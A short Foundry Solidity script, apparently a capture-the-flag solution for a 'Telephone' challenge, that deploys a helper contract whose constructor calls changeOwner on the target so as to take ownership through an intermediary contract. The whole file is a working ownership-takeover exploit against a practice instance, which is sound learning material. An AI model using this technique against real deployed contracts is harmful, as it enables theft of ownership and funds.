// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address telephone = vm.envAddress("TELEPHONE_INSTANCE");
    address my_eoa_wallet = vm.envAddress("MY_EOA_WALLET");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));
        
        new Player(telephone, my_eoa_wallet);
        
        vm.stopBroadcast();
    }
}


contract Player {
    constructor(address instance, address new_owner) {
        instance.call(abi.encodeWithSignature("changeOwner(address)", new_owner));
    }
}